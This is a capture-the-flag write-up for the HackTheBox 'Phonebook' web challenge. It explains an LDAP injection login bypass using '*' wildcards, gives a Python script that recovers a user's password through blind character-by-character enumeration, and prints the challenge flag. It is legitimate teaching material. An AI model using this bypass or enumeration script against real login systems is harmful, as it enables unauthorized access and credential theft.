---
title: "HackTheBox - Phonebook (LDAP Injection)"
description: "Login bypass via LDAP injection. Wildcards in the username and password fields allowed authentication as any user, leaking credentials through blind enumeration."
platform: "HackTheBox"
category: "Web"
difficulty: "Medium"
date: 2026-01-10
---

## Challenge Info

**Platform:** HackTheBox
**Category:** Web
**Difficulty:** Medium

## Recon

The app had a simple login form. I started testing for SQL injection but nothing fired. Looking at how the errors came back and the URL structure, I had a feeling it was using a directory service (LDAP) instead of a database.

To test I threw a `*` in the username field with a random password and it logged me in. That confirmed LDAP injection. In LDAP, `*` is a wildcard that matches anything.

## Authentication Bypass

```
username: *
password: *
```

That got me in as the first matching user. The flag was visible from there.

## Blind Credential Enumeration

I also wanted to pull the actual password. The idea is to use LDAP wildcards to test one character at a time:

```python
import requests
import string

url = "http://<target>/login"
charset = string.ascii_letters + string.digits + string.punctuation
password = ""

while True:
    for c in charset:
        r = requests.post(url, data={
            "username": "reese",
            "password": password + c + "*"
        })
        if "Invalid" not in r.text:
            password += c
            print(f"[+] Found so far: {password}")
            break
    else:
        break

print(f"[*] Final password: {password}")
```

If the response is different when the character matches, you can rebuild the full string character by character.

## Flag

```
HTB{d1rectory_h4xx0r_is_k00l}
```

## What I learned

- LDAP injection is easy to miss if you only think about SQL
- The `*` wildcard in LDAP works similarly to `%` in SQL
- Blind enumeration works well here since the app gives different responses for valid vs invalid credentials
